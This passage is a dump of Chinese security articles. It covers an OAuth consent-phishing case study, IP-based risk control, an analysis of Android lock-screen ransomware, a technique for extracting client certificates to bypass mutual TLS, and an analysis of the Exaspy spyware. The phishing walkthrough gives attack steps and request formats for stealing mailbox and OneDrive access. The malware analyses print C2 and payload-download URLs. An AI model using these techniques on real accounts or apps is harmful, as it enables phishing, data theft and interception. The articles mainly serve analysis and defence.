如果用户在上一步中点击了YES，IDP就会生成AuthCode给应用。应用会将自己的ApplicationID、secret、用户的AuthCode一并发送给授权服务器，如果这三个参数确认无误，服务器就会返回一个accessToken给应用，然后应用带着这个accessToken就能获取资源服务器上用户的资源（SCOPES中申请的权限）。上图为你已允许授权的应用。其实，整个攻击大致可以分为以下几个步骤：1、创建一个应用Sappo2、利用该应用创建一个申请授权的链接（SCOPE）3、用户给应用Sappo授权后，获取AuthCode4、利用AuthCode获取accessToken5、使用accessToken以API请求的方式获取所有资源下面来讲一讲具体的实施步骤。一、创建一个应用 我们将在Microsoft平台上创建一个名为”Sappo”的应用，通过该应用来盗取Office365和Windows Live用户的数据。首先，我们登录Outlook账号，访问apps.dev.microsoft.com，创建一个新的应用，然后我们会获取到该应用的Application ID和Secret，同时我们也需要设定一个end–point来回收后面服务器返回的AuthCode和accessToken，这个end-point需要我们可控，并且一直监听所有的请求。上图为创建的”Sappo”应用Sappo这个框架的作用就是利用授权accessToken来获取用户的数据。为了更直观的演示整个过程，接下来在Sappo上创建一个app，用来作为end-point，我们将这个app命名为”MS PRO O365 AntiSpam”，目的是模仿AntiSpam Pro免费版，这样用户在查看的时候，才不会产生怀疑。二、创建一个申请授权的链接（SCOPE）为了获取权限，用户会被url重定向至Microsoft，该url要包含如下格式数据：GEThttps://login.microsoftonline.com/common/oauth2/authorize/common/oauth2/authorize?scope=[scope_list]&amp;response_type=[code]&amp;client_id=[client_id]&amp;redirect_uri=[redirect_uri]通过client_id来指明是哪个应用申请授权，通过scope来指明申请的是哪些权限，通过redirect_uri来指明返回的AuthCode要送到哪里去。上图为应用被允许申请的Windows Live权限，其中有一些允许通过API来读写邮件，但实际上真正操作的时候是会被禁止的。上图为Windows Live中更多的允许应用和OneDrive、OneNote进行交互的授权。 上图为Office365中允许API进行邮件读写删除的授权一旦设置好链接，就可以通过邮件进行发送了。我们选择使用Microsoft的邮箱账号来进行邮件的发送，并且将邮件的内容伪装成像来自AntiSpam Pro一样。我们在上面建立的app中已经集成了这样的功能，这里还需要选定一个攻击对象，如下图。最后发出去的邮件是下面这样子的。用户收到这封邮件后，如果他点击了链接，用户就会被重定向到授权页面。就像上面你看到的，这是一个web钓鱼，并不要求用户输入用户名和密码，而且页面是在Microsoft的域名下，是来自https的请求，并且证书也是绿标的。三、获取accessToken当用户点击YES授权后，AuthCode会被传送到先前设定的Redirect‐URI，接下来应用就可以通过如下的格式去申请获取accessToken：POST common / oauth2 / HTTP / 1.1 tokenHost: https://login.microsoftonline.comContent‐Type: application/x‐www‐form‐urlencodedgrant_type=[ authorization_code ]&amp;code=[ authCode ]&amp;client_id=[ client_id ]&amp;client_secret=[ secret ]&amp;redirect_uri=[ redirect_uri ];client_id为应用的Application ID，secret为当前应用的secret，如果AuthCode验证通过了，则accessToken会被发给已经设定的redirect_uri。如上图，accessToken是以JWT (JSON Web token)的格式返回的，是一串经过URL编码后再BASE64编码的字符串，其中包含3部分：Header、Payload、Signature。经过解码后的数据如下图所示： scp中规定了我们的应用已经申请的权限。每次向IDP发起API请求资源时都要附带上accessToken的原始数据，格式如下：Https://login.microsoftonline.com/common/oauth2/authorize GETHTTP / 1.1Host: login.microsoftonline.comAuthorization: Bearer [ access_token ]四、使用API获取用户在IDP的数据在用户点击了授权之后，我们在sappo上搭建的应用能够自动实现获取authCode并转化为access_token，这时候我们只要操作一下界面就能以API的形式向IDP申请获取数据。以Office365为例，再这例中，我们拥有足够的权限来操作邮件服务。 如上图，我们可以查看用户的邮件，当然我们也能以用户的身份对外发送邮件。 如果你要撤销此类授权怎么办?这就需要你到Office 365的配置中，找到相关应用，点击取消授权，就可以成功撤销授权了。接下来我们再以Windows Live为例，和之前的Office 365 步骤差不多，唯一不同的是，这里需要把申请的权限换成Windows Live设定的。同样地，用户点击了YES后，就会给我们的应用授权，在我们获取到accessToken之后，就能以API的方式去请求用户的数据了。我们还需要注意的就是，虽然Windows Live的权限申请中有包含email，但是目前是不可以访问的。 虽然邮件不能访问，但是我们可以去看看用户存储在OneDrive上的数据，只要点击上面的”OneDrive storage”， app就会向资源服务器自动发起请求，我们就能进到该用户的OneDrive中了，然后你就可以进行一系列操作，就像使用自己的账户一样。同样的如果你要撤销此类授权，需要到”应用和服务”选项中，找到这个应用，然后点击取消授权。点击进入这个应用后，你就能看到这个应用已经申请的权限其实，这个案例颠覆了我们队网络钓鱼的传统观念，我们之前会说钓鱼网站会通过让用户填入账号密码，然后盗取你的数据，但这个例子就是一个很好的佐证。我想，就算是专业的安全人士也不一定能在第一时间识别出来。所以，我们在给应用授权的时候，一定要十分小心。万事都要从安全性出发，没有了安全性，估计也没有人敢用你的产品和服务吧？当然，如何对应用进行限制，也是值得我们进行深入研究的。","2016-12-04 19:52:20","Web安全","案例分析：利用OAuth实施钓鱼","http://nsoad.com/Article/web/20161204/879.html"
"5ccbf9ea4f2f0a0a7a69bfe6","前言互联网时代，ip一直在网络安全和风险控制领域占据着最为重要的地位，主要是出于以下因素：1. 所有的网络请求都会带有ip信息，因此其天然的成为访问者的身份标识。2. 由","kong","前言互联网时代，ip一直在网络安全和风险控制领域占据着最为重要的地位，主要是出于以下因素：1. 所有的网络请求都会带有ip信息，因此其天然的成为访问者的身份标识。2. 由于ip的管理和分配比较严格，很难造假。虽然会有代理、肉鸡等掩藏踪迹的手法。但绝大部分情况下，ip数据的真伪是可以信得过的。3. 由于ip属于网络层，可以轻松的对其进行阻断。现有的各种网络安全、负载均衡的设备和软件，都是以ip为对象进行追踪和管理的因此，常见的攻击防范和风险控制都会利用IP来作为用户的身份标识，来进行分析和处理：一、IP常见分析方法（一）IP客观属性目前的IP分配都由专门的机构或官方来统一分配和管理，所以有很多客观上比较准确的属性可供参考：1. 归属地。目前每个ip的归属地在较短的时间内都会保持固定，可以用来判断请求来源的大概位置。a. 归属地数据目前有免费和商业的服务，搭建自己的ip库b. 归属地的变更相对来说更频繁，在数据源的选取上需要找更新较频繁的c. 现在3/4G的移动出口会带来混淆，手机上网的ip可能只能反映手机卡归属地，所以要小心这一部分数据2. 所属机构。大型组织机构申请的固定ip都需要绑定信息，可以从ASN数据获取一些端倪。例如我们可以借此判断IP是否属于公有云平台、教育网。3. 绑定域名。通过DNS可以查询到域名相关的ip，同样，部分ip可以反查出相关联的域名。一个典型的应用是通过ip将大型搜索引擎的ip查出，防止误杀。不过只适用于google、bing、百度这样的大型搜索引擎，才能反查出域名，国内其他的搜索引擎还不行。4. 其他。还有一些其他属性，例如是否属于手机基站等，可以通过其他手段来获取。这里是一个例子，我们通过系统分析发现了一个可疑ip，这里面ip的归属地、vps信息、公有云平台信息都是ip的客观属性，可以辅助我们做决策。事实上，目前看来大部分的普通攻击行为来自于云服务器，从直觉上来说，普通用户也不应该通过公有云平台来访问网站。所以有时候，如果发现客户ip是公有云平台的，可以直接将此请求置为高危。（二）IP主动探测属性ip除了一些客观属性，还可以通过主动探测来作进一步了解：1、 是否是邮件服务器。2、是否是web服务器。3、是否是vpn服务器。4、是否是代理服务器。这里可以通过包括端口扫描在内的一系列主动探测、尝试技术来获取信息，来辅助判断：1、对于普通个人用户或者是出口ip而言，不会有相应的服务与ip绑定；否则，极大概率是机器行为。目前互联网上的流量，有很大一部分是机器行为，所以这块信息在人机判断上可以起到很大的作用。2、不过现在有一些例外，有一些流氓的家用路由器可能会开通一些端口和服务，不过这一类用户本身就属于高风险来源。（三）IP行为ip的属性准确性是比较高的，但并不能覆盖所有场景，所以有时候还需要根据ip的相关行为作出判断：1. 该ip的请求是否有注入、撞库、ddos、漏洞扫描等网络攻击行为。2.该ip的用户是否有刷单、恶意欺诈、薅羊毛等风控相关的的行为。3.ip和用户名、设备指纹等的关联信息。如果发现某个用户、设备上有非常多的用户，极大的概率可以将此用户和设备拉黑；反过来，当某个ip出现了大量的用户或设备，也是风险提示，不过要排除组织出口等属性的影响。上图显示出某个ip上的用户行为，可以看出在有规律的切换账号进行操作，这样就把松散的攻击，以IP为纽带联系起来，方便识别。4. ip的归属地特性也可以与用户行为结合起来。常见的分析方法包括识别用户常用ip，以及用户是否短时间内发生了较大的地理偏移（通过比较使用的不同ip的归属地）。5. 更复杂的分析包括利用ip、用户、设备之间两两关联的信息可以勾画出网站内用户之间的关联网络、以及用户间的资金流向，这在反洗钱、复杂欺诈行为识别等方面具有显著效果。（四）IP历史行为辅助通过对自身网站用户行为的分析，可以找出绝大部分的有害访问，但还是有以下缺点：1. 除了少数巨头，大部分网站自身的数据体量小，不足以作完善的分析。2. 需要较大的技术和资源投入，普通公司无法承担。3. 比较偏向于事中和事后，很难做到事前的预防。目前，还有一种方式是借助于互联网上的一些黑白名单来弥补这方面的不足，这些黑白名单来源于他人网站上ip的历史行为。但这种方式有一些缺陷：1. 相对来说，风险行为跟时间和场景密切相关，所以他人的黑名单不见得对所有人合适，即使这个“他人”是巨头。2. 目前互联网上的信息泛滥，这些黑白名单是否值得信赖？3. 大量的ip与使用者之间没有强绑定，另外，后一节将会提到ip在身份识别的作用上已经逐渐力不从心。我们自身也有提供上述信息的数据服务，但在历史行为这一块还是采取较保守的策略：1.历史行为相关的数据采用较短的过期设置，来应对ip被轮换出去的情况2.数据来源方面，采取信任的来源。一种是自己去部署的蜜罐分析出来的结果；另一块是我们有标准化的大数据分析平台和策略，通过合作客户的黑名单数据交换来扩充自身数据库。不过即使是这样，还是需要用户有正确的使用姿势，不要纯粹当成黑白名单来使用，更多的是作为自身数据分析的补充。二、IP的颓势需要指出的是，从最近几年开始，IP在作为用户标识的作用日渐削弱，从而极大的影响到了其在安全防范和风险控制方面的有效性：1. IPv6 已经不是新话题，虽然进程非常缓慢，但趋势无法逆转；IPv6的场景下，ip唯一性会难以保证。好在现在IPv6的普及率都很低，不管是用户还是网站。2. 目前，国内大部分用户是没有独立ip的，基本上是在公司、学校、网吧等地方上网，大家共享出口ip。以教育网为例，它共有76000+ C类地址，虽然已经是比较多的资源，但还是不能完全覆盖它内部整个网络，会有很多学校只能分配到少数资源，导致大量的学生都共享同一个公网ip，有一个调皮了就会影响到一群人。对这类ip，需要非常小心。3. 近几年移动化浪潮下，共享ip的问题尤其突出。现在大部分网络访问来自移动设备，要么是wifi地址，要么是3/4G出口。如果是后者，同一ip下的设备数量会非常惊人，贸然采取行动的话会死的很惨。移动时代，ip的作用已经大为减弱。4. 即使是独立ip，也很难对其采取长时间的措施。一种独立ip是电信买的固定ip，但这种成本高昂，拿来做坏事是得不偿失的； 一种是最普遍的adsl拨号，这种每个人分配到的都是临时ip，会很快被换到其他人手上。目前很多高级的爬虫会采用这种形式（甚至有专门的拨号云主机出售），当被攻击对象进行封禁时候，只要重新拨号就可以获取新的ip，继续攻击行为；同时网站还不敢对这种ip进行长时间封禁，因为这些ip可能很快会被分配给普通用户使用，从而影响到普通用户的使用体验。对于这种攻击，只能是实时行为分析并阻断+短时间封禁来应对，对数据分析能力和网站技术框架带来很大的考验。ip的上述特性，使得使用者需要采取更加专业和谨慎的姿势。三、IP的正确使用姿势在我们和客户的合作过程中，整理了一些对ip信息在安全防范和风险控制场景下的建议：1. 把ip信息单纯的作为黑白名单会带来一定的误杀率，不小心的话会带来比较严重的结果，需要一种合理的方式，并结合自身的情况来处理。2. 但是我们也发现，很多用户在分析过程中，过多的偏重于手机号等特性，忽视了ip的作用，这个其实损失了大量的风险信息，也会对误杀率（基站数据、教育网、组织出口数据等信息作白名单）和覆盖率（服务器、公有云平台、搜索引擎等信息辅助）带来影响。3. 对于所有的用户来说，都需要很好的利用ip的固有属性，无论是客观的还是主动探测的。这些属性分别在白名单和黑名单方面都有比较明显的贡献，如果自身有风控系统，应该将这些信息补充到自己的模型或策略中，可以起到明显的增强效果。4. 对于ip历史行为（常见的黑白名单）的数据来说，要挑选数据源，误杀率重于覆盖率。而如果有自身的风控系统，两相印证才是最合理的使用方法。","2016-11-18 19:21:47","网络安全","浅谈如何利用IP数据来辅助风控和安全系统","http://nsoad.com/Article/Network-security/20161118/808.html"
"5ccbf9ea4f2f0a0a7a69bfe7","2017年2月13-17日，RSA Conference 2017 信息安全大会在美国旧金山Moscone中心隆重举行。大会第一天就是一系列关于Ransomware（勒索软件）的议题，而在刚刚过去的2016年，“MongDB数据库网络勒索事....","盘古实验室","事件说明2017年2月13-17日，RSA Conference 2017 信息安全大会在美国旧金山Moscone中心隆重举行。大会第一天就是一系列关于Ransomware（勒索软件）的议题，而在刚刚过去的2016年，“MongDB数据库网络勒索事件”，“ElasticSearch数据库网络勒索 事件”，网络勒索问题已成为互联网安全的重点关注问题之一。此前，某安全研究人员在知乎专栏爆料，某黑产团伙利用嵌入恶意代码的刷钻应用进行QQ盗号和恶意锁屏，感染用户高达八千人。近日，盘古实验室发现同一团伙传播的升级版恶意应用，企图锁屏用户移动设备，进行敲诈勒索。一、背景概述在某社区平台，有安卓用户称在QQ群中下载了“爱扣字”这款应用，导致手机被恶意锁住，无法正常使用。通过感染用户提供的锁屏图片中的QQ群号码，我们找到了管理员的QQ号。管理员的QQ签名明确标注了解锁的价格。管理员签名：“想要解锁自己的手机，需要联系加QQ群189894077，联系管理员，QQ红包35元，微信支付宝40元。”二、恶意锁屏触发流程盘古实验室在获取到恶意样本后，在安卓模拟器上进行了测试，还原其锁屏触发流程及技术原理。下图为恶意锁屏的触发流程图。在安装“爱扣字”应用后，打开应用程序，弹出“扣字神器”的安装界面，提示安装“扣字神器”应用。安装并打开“扣字神器”。“萌宠大揭秘”中的GIDGET，看起来萌萌的。在点击“点击开始免费激活”按钮后，跳转到下图第二个界面。弹窗“激活完全免费”，点击“激活”。同时第三个界面弹窗询问是否激活设备管理器，激活后，跳转到上图第四个界面。前面的几个界面看起来都相对可靠，这个界面看着些许不适，风格诡异。点击“点击开始root”后，设备黑屏并重启。重启后，设备已经被恶意应用锁屏。在整个锁屏触发的过程中，真正具有恶意锁屏行为的应用是“爱扣字”推送安装的程序“扣字神器”。三、样本技术原理（1）锁屏原理锁屏类勒索软件通常利用WindowManager.LayoutParams的flags属性，设置成某个固定的值，使悬浮窗口悬浮置顶。本文中的恶意应用也利用了同样的方法。国内的大多数勒索类软件也大多是利用同样的手段。除了锁屏，对于按键操作，程序也进行了监控。当按键为4或82时，执行com.bugzapk.z的代码。4代表的是返回键，82代表的是菜单键。代码中并未出现监控音量键、关机键等特征代码。com.bugzapk.z中的代码主要作用是将bug.apk放在system目录中，作为系统应用开机启动，达到长期恶意锁屏的目的。而bug.apk正是重命名的“扣字神器”这款应用。（2）密码加密算法应用程序中解锁密码并没有明文存储，而是利用了AES加密和压缩算法，将密码进行加密后存储。压缩算法：解密前原数据：解密后明文：（3）其他恶意行为在恶意应用运行的过程中，会主动请求网页""http://www.wencaojun.top/xnsmtp.html""，而网页中的内容是邮箱和一串类似密码的字符串。历史恶意样本是发送序列号加密后的字符串到指定邮箱，而这个恶意应用虽然保留了部分历史代码，在此基础上添加了代码，但是在测试的过程中并未出现发送邮箱的行为。在代码中也出现了一些可疑邮箱。四、解锁流程在整个解锁的流程中，并不如“解锁管理员”签名中所述，解锁只需35元或者40元就可以解除屏幕锁定。经过测试我们发现，想要解锁设备至少要有三个密码才能解锁。而这些密码，与解锁界面中生成的序列号毫无关系，其中有两个密码保存在远程服务器上，管理员可以随意修改。（a）第一个解锁界面在恶意软件安装后，程序会自动发送HTTP请求到指定的服务器。若HTTP请求成功，则设置第一个解锁界面的解锁密码为网页""http://www.wencaojun.top/sj.html""中声明七中的数字；若HTTP请求失败，则设置第一个解锁界面的解锁密码为4312。（b）第二个解锁界面第二个解锁界面中有三个密码可以使用，分别是4951,997998和2415。这几个密码加密存储在恶意应用的代码中，并不是明文可见。这里的逻辑处理很有趣。密码输入4951会返回到第一个解锁界面；密码输入2415，成功解锁，跳转到第三个解锁界面；密码输入997998，则会提示机型不支持，需提供机型给管理员解锁。这里的机型是程序通过获取设备信息获取到的，是真实信息，但是机型不支持只是一个套路罢了。在输入997998跳转到如上图所示界面后，输入密码2415跳转到第三个解锁界面。（c）第三个解锁界面第三个解锁界面实际上修改了系统的pin值，设置了新的pin值。第三个解锁界面的解锁密码与在安装程序时是否激活设备管理器有关。程序安装时会询问是否激活设备管理器。若激活设备管理器，则程序从远程服务器端获取密码，密码来源于""http://www.wencaojun.top/pin.html""。若未激活设备管理器，则密码为程序加密存储的数字3957。至此，整个程序才算解锁完毕。当然，这仅是解锁完毕。如果解锁后没有立即删除该恶意应用，重新启动手机后该应用仍会继续自动启动并锁屏。五、恶意锁屏产业链恶意样本代码中包含若干手机号码、QQ号、QQ群等信息，根据以上信息及感染用户提供的信息摸索，其产业链也越发清晰。该团伙利用受害者贪小便宜的心理，多次在安卓逆向破解群、安卓反编译群、扣字群、QQ刷赞群等多个群中埋伏，在群文件中共享包含恶意代码的锁屏应用，并伪造成免费应用的样子，伺机传播。在用户下载安装后，通过指定QQ群进行联系。QQ群一般伪装成普通的游戏交流群或日常沟通群。通常情况下，群主不参与整个勒索的流程，会提示受害者联系管理员进行解锁。管理员则会对受害者多次索取解锁费，达到勒索钱财的目的。勒索团伙具备高度的反侦查意识。在获取样本后的短短几天内多次更换群主和管理员，解散QQ群，建立新的牟利链。QQ账号注册成本低，一个手机号码可注册多个QQ号。即使QQ号被举报，被腾讯公司收回，也可以使用相同的手机号继续注册，并且经常更换QQ号码也会在一定程度上避免其账号在社交平台大肆流传，影响牟利。而之前在其他社交平台被披露的QQ群，大多数已解散。现在仍旧被用来维持业务的QQ群基本上都是16年之后建立的。与其他敲诈勒索团伙不同的是，这个团伙在百度贴吧中专门建了一个贴吧进行自己的解锁宣传。虽然贴吧排名不高，帖子数量少的可怜，但是仍然可以通过其中几个解锁管理员的QQ搜索到。正如恶意样本技术分析中描述的一样，用户设备受到感染至少执行3个步骤，至少可牟利100元。而这样低成本的恶意锁屏软件，每天感染3个用户，月收入就过万了，日积月累，涉案金额并不是一个小数目。六、安全建议恶意锁屏敲诈勒索的事件中，所安装的应用均来自QQ群，论坛等非正规渠道，而这些渠道并不具备大型应用市场相对严格的审核制度。对于已经感染该恶意样本的用户，可通过本文中的解锁流程进行解锁操作，解锁后立即删除该应用，避免掉入循环付费解锁的黑洞。针对安卓用户，应尽量避免安装来历不明的应用，对于应用获取root权限等敏感行为的操作也应该保持警惕，避免遭受损失。","2017-02-19 14:03:31","移动安全","国内典型勒索软件详情分析(附解锁方法)","http://nsoad.com/Article/MobileSecurity/20170219/1068.html"
"5ccbf9ea4f2f0a0a7a69bfe8","以前给一家证券机构做测试，第一次碰到了服务器双向认证的问题，当时双向认证的概念还没有推广开来，所以折腾了很久，虽然当时不知道原理，但是也算是解决了双向认证走代理的问题了。前段时间，碰到了一个","Kong","本文由wadcl原创投稿安全脉搏，原文链接，安全脉搏独家发表本文，如需要转载，请先联系安全脉搏授权；未经授权请勿转载。以前给一家证券机构做测试，第一次碰到了服务器双向认证的问题，当时双向认证的概念还没有推广开来，所以折腾了很久，虽然当时不知道原理，但是也算是解决了双向认证走代理的问题了。前段时间，碰到了一个apk，想抓包看看数据，发现用的也是双向认证，所以就折腾了一下。当服务器启用了双向认证之后，除了客户端去验证服务器端的证书外，服务器也同时需要验证客户端的证书，也就是会要求客户端提供自己的证书，如果没有通过验证，则会拒绝连接，如果通过验证，服务器获得用户的公钥。正式因为如此，双向认证以便都是企业内部或者证券、银行等这类用户使用，而如何保证证书的合法和保密性，就不可能通过一个公开接口去提供给访问者下载，所以一般都是放入usb-key中，或者是提供一个身份认证接口，认证通过后，可以下载安装，但是一般不会如此使用，这样的话，使用者多个电脑都安装的话，其他人也就可以使用了，所以保证唯一性，大部分都会采用usb-key的方式，所以也就限制了双向认证的使用，但是这几年手机端应用的推广，和安全的推进，很多企业在apk中直接封装了客户端的证书，使得我们想对app基于行为的安全检测，无法成功。突破证书限制所以相比于单项的认证，其实也就是多了一个服务器端验证客户端证书的过程，而在以往的用代理工具如burp和fiddler这一类工具，抓取https的包时，除了浏览器获取的是代理工具的证书外，默认是不发送证书给服务器端的，而其实代理工具也提供了双向认证的证书发送，如fiddler的ClientCertificate.cer证书。只要提供了客户端的证书，也就实现了双向认证的破解过程。所以重点在于如何提取出证书来。WEB应用上证书的提取最简单的一种就是，直接安装证书，或者使用时查看证书属性，在双向认证中一般会弹出此框，或者usb-key中如果有导入证书的功能的话更好，一般安全系数高的话，是会设置各种门槛阻止你获取证书的。点击后直接安装：安装完成后，就可以直接导出证书了。或者直接通过keytools工具来生成证书。安卓APP下的证书在应用中嵌入证书，使得每次请求都读取证书并发送，这样做，证书一般就需要和安卓应用一起打包，甚至放置的trustStore信任集，就需要密码来单独提取和安装证书了。拿到apk包，首先需要解压出来内部的文件：可以搜索一些证书的后缀文件，例如cer/p12/pfx等，一般安卓下的为bks，也可以先去assets或者res目录下去找找。例如我碰到的apk就在assets目录下存放：我们双击p12安装一下，提示需要私钥密码：用java代码模拟双向认证的请求的过程：        // 双向认证证书        KeyStore keyStore = KeyStore.getInstance(""PKCS12"");        KeyStore trustStore = KeyStore.getInstance(""jks"");        // keyStore是服务端验证客户端的证书，trustStore是客户端的信任证书        InputStream ksIn = new FileInputStream(""E:/Java/jre8/lib/security/re/1.pfx"");        InputStream tsIn = new FileInputStream(new File(""E:/Java/jre8/lib/security/re/1""));        keyStore.load(ksIn, ""123456"".toCharArray());        SSLContext sslContext = SSLContexts.custom().loadTrustMaterial(trustStore, new TrustSelfSignedStrategy())                .loadKeyMaterial(keyStore, ""123456"".toCharArray()).setSecureRandom(new SecureRandom()).useSSL().build();        ConnectionSocketFactory pSocketFactory = new PlainConnectionSocketFactory();        SSLConnectionSocketFactory sslConnectionSocketFactory = new SSLConnectionSocketFactory(sslContext);        Registry&lt;ConnectionSocketFactory&gt; r = RegistryBuilder.&lt;ConnectionSocketFactory&gt; create()                .register(""http"", pSocketFactory).register(""https"", sslConnectionSocketFactory).build();        PoolingHttpClientConnectionManager secureConnectionManager = new PoolingHttpClientConnectionManager(r);        HttpClientBuilder secureHttpBulder = HttpClients.custom().setConnectionManager(secureConnectionManager);        HttpClient client = secureHttpBulder.build();        HttpGet httpGet = new HttpGet(""https://xxx.com"");        HttpResponse httpResponse1 = client.execute(httpGet);反编译了代码后，发现被加固过，于是想脱壳，用了网上说的动态脱壳，不知道是不是水平问题，还是这个方法已经过去式了，反正没有成功，那咋办呢？想到一个取巧的方法，直接搜历史app版本的记录，首先确定那个app之后开始时https的访问请求，然后在看这个app有没有加固过，最终是找到了一个年初的版本，这个版本已经开始使用了https，但是还没有完美的加固，至于历史版本，官网几乎删除了，不过有很多应用商店，如豌豆荚。(脉搏小编：历史版本这个取巧方法不错）app依然有些地方被混淆了，不过无所谓，因为混淆代码一般混淆的都是自己编译的方法和类，向调用证书的函数方法，一般是组件类的，尝试的找了一下，总有一些蛛丝马迹：最终还是找到了：如此获取到了秘钥之后，就可以直接导入和生成证书了。【本文由wadcl原创投稿安全脉搏，原文链接，安全脉搏独家发表本文，如需要转载，请先联系安全脉搏授权；未经授权请勿转载。】","2016-12-14 13:09:36","移动安全","如何突破双向证书认证防护","http://nsoad.com/Article/MobileSecurity/20161214/916.html"
"5ccbf9f34f2f0a0a7a69bfe9","随着Android商业间谍软件的发展演变，我们也开始步入了移动威胁新时代。也就是说，你不再需要借助技能高超的技术专家去入侵别人的移动设备，你所需要的就是通过网络购买操作","Kong","随着Android商业间谍软件的发展演变，我们也开始步入了移动威胁新时代。也就是说，你不再需要借助技能高超的技术专家去入侵别人的移动设备，你所需要的就是通过网络购买操作简单的间谍软件即可，这些软件和可以对网站进行DDOS攻击的工具一样，威力十足。这一变化是移动恶意软件进化过程中至关重要的一步，同时这一变化也将使得主动性移动威胁防御变得尤为重要。背景介绍9月初，安全公司 Skycure 的研究人员通过其自身的“众包情报政策（crowd-sourced intelligence policies）”（运行Skycure手机应用程序充当威胁检测传感器）发现，在其一位客户的企业系统中存在一个伪造的应用程序。该客户是一家全球性的科技公司，其企业内部的所有iOS和Android设备均部署了Skycure的企业移动威胁防御解决方案。研究人员已经在该公司副总裁的 Android 6.0.1 设备上发现了该恶意软件。目前，我们已经获得用户允许，披露一些关于Skycure发现间谍软件应用程序的细节。我们发现了什么？ 受害者的Android设备被一种名为“Exaspy”的恶意程序感染，Exaspy是一种新型安卓商业间谍软件，允许攻击者访问受害者的众多数据信息，其中包括：聊天信息和邮件：SMS、MMS、Facebook Messenger、谷歌视频群聊、Skype、Gmail、本地电子邮件客户端信息、Vibe以及WhatsApp等等；音频：能够记录在后台或通话过程中获取的音频信息；图片：能够访问你的图片库，还能对你的设备进行秘密截图；历史数据：能够收集联系人列表、日历、浏览器历史记录以及通话记录等等；命令和控制（command and control，CNC）服务器能够执行自身请求，其中包括:监控和传送本地文件，例如图片和视频等；执行shell命令，或者产生一个逆向shell，以允许应用程序使用基本包中不包含的漏洞来运行特权。对于最终用户而言，潜在的危害是极大的，可能会对企业造成附加风险带来更恶化的结果。以下罗列的只是该恶意软件在企业移动设备中运行可能带来的几个后果：收集公司的机密信息，其中可能包含财务信息、知识产权、产品信息以及机密会议的记录等等；勒索企业支付高额赎金，以防止信息遭到泄露；恶意软件是如何运行的？ 基于Skycure研究实验室对于Exaspy恶意软件的分析，我们对于该恶意软件运行的过程，已经能够识别到一些主要的特征。有趣的是，该恶意软件实际上需要一个最终用户来执行最初的安装步骤，也就是说，对设备进行物理访问，安装环节是必不可少的。以下是该应用程序在第一次运行时进行自我安装的过程：恶意软件请求访问设备管理权；请求（友好地）获取一个许可号码；隐藏自己；请求访问root（如果设备是通过rooting应用程序进行管理）。一旦成功，它就会自行安装成一个系统安装包，此举加剧了卸载的困难性；需要注意的是，尽管root访问请求可能会被SU管理者（如SuperSU权限管理）拒绝，但是一旦启动CNC连接，服务器就会发送一个root 应用完成自我执行的过程。一旦成功安装应用程序，恶意软件就能够在移动设备上通过以下方式运行：该应用程序被命名为“谷歌服务（Google Services）”并将工具包命名为“com.android.protect”；很明显，该恶意软件是伪装成“谷歌服务”——一个流行的Android应用程序API，可以用来丰富他们的应用程序（推送通知、地图等）。该应用程序与如下服务器进行通信：hxxps://api.andr0idservices.com（130.211.9.200，托管在谷歌云中）；从硬编码链接hxxp://www.exaspy.com/a.apk中下载更新程序； 该应用程序将自动从发射器中隐藏自己（通过禁用其主要活动组件）；该应用程序将禁用三星的SPCM服务和com.samsung.android.smcore包，所以它可以在没有三星服务查杀的环境中运行； 该应用程序还将自行安装成一个系统安装包，以防止用户对其执行删除操作。有何有趣之处？Android和iOS的间谍软件已经存在很长时间了，但是一些备受瞩目的事件似乎在向我们传递一个信号：间谍软件开始针对一些知名人士（包括企业高管等）实施复杂持续的攻击。值得一提的是发现于今年8月的一款名为“Pegasus”的间谍软件，主要被其政府用于阿联酋人权运动中，攻击持异见的民主党官员的手机。目前，传统的反恶意软件产品依然不能很好地检测该类恶意软件，因为传统的方法需要对每个新型恶意软件家族创建一个签名。这个签名可能是可执行文件中的一个字符串、一个链接库或是编译后的代码样本等。但是创建这种签名需要人工对样本进行检测，需要花费很多的时间和人力成本来进行，而且结果还往往是不成功的。这就是为什么传统的反病毒和反恶意程序软件解决方案需要频繁更新的原因所在。其他的方法包括在沙箱（动态分析）中执行应用程序也能够检测出部分此类威胁。正如我们在AppSecEU16（点击查看视频）中展示的一样，当沙箱被检测时恶意应用程序很容易会释放出恶意代码。在这种情况下，Skycure公司众包情报收集的数据就可以察觉出该应用程序存在异常。IT管理人员应该意识到的是，大量的间谍软件攻击者可以轻松地在线购买并运用这种攻击。如何保护自身和最终用户的安全？为了阻止攻击需要对你的设备进行物理访问：设置密码和指纹身份认证；禁用USB调试；确保OEM 解锁功能处于关闭状态；定期检查Android的设备管理员列表并且禁用你不信任的组件；安装Skycure的移动威胁防御解决方案（赤果果的广告植入吗？），保护用户有效防御此类威胁；避免从不受信任的软件商店下载应用程序；不要给不需要的应用程序特殊权限； 结论以前移动攻击需要很高的技能水平才能完成，所以很罕见。但是在如今的市场上，任何人都可以轻易地购买到所需的恶意软件，这也使得威胁形势日益严峻。我们上面介绍的Exaspy间谍软件，还只是IT专业人员需要对抗的恶意软件包中的其中一个。而当我们考虑到下面这些统计数据时，我们会发现防御的难度比我们想象的更艰巨：根据IBM统计，数据泄露的平均成本为400万美元；Skycure移动安全季度报告显示，27%的用户正在运行一个过时的手机操作系统；同样来自Skycure的报告显示：在对移动设备进行监视时发现，45%的移动设备在监视前4个月内将会遭遇一次网络攻击；当你将这些数据和威胁（如Exaspy）结合起来看，很明显，IT专业人士必须为如今的移动市场做点什么了！因为只要在一个用户的设备上安装恶意软件就能将整个企业置于危险之中。相关技术细节以下列举部分技术细节，希望可以帮助IT专业人员检测自身企业中是否含有此类应用程序：已知的哈希（hashes）：c4826138e07636af1eeb6008e580704575ec1bc7；4bf89c3bf4fb88ad6456fe5642868272e4e2f364；9725c1bf9483ff41f226f22bd331387c187e9179；c4826138e07636af1eeb6008e580704575ec1bc7；f1fbebc2beafe0467ee00e69b3f75719cdbbd693 软件包名称：com.android.protect公钥信息:Subject: /O=Exaspy/OU=Exaspy/CN=ExaspyFingerprint: c5c82ecf20af94e0f2a19078b790d8434ccedb59","2016-11-09 11:15:36","网络安全","专攻企业高管的安卓商业间谍软件Exaspy被揭露","http://nsoad.com/Article/Network-security/20161109/724.html"
